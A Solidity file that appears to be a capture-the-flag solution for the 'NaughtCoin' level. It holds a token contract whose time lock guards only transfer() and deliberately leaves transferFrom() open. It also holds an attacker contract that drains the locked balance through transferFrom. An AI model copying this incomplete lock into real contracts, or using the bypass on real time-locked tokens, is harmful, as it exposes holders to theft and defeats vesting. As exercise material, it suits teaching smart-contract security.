// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) public ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(
        address _to,
        uint256 _value
    ) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}

contract NaughtCoin_Attacker {
    NaughtCoin private naughtCoin;

    constructor(address _naughtCoinAddress) public {
        naughtCoin = NaughtCoin(_naughtCoinAddress);
    }

    function transferAttacker(address _from, address _to) external {
        // call so that msg.sender is the current contract
        (bool transferSuccess, ) = address(naughtCoin).call(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                _from,
                _to,
                naughtCoin.balanceOf(_from)
            )
        );

        if (!transferSuccess) {
            revert("Failed to Transfer");
        }
    }
}
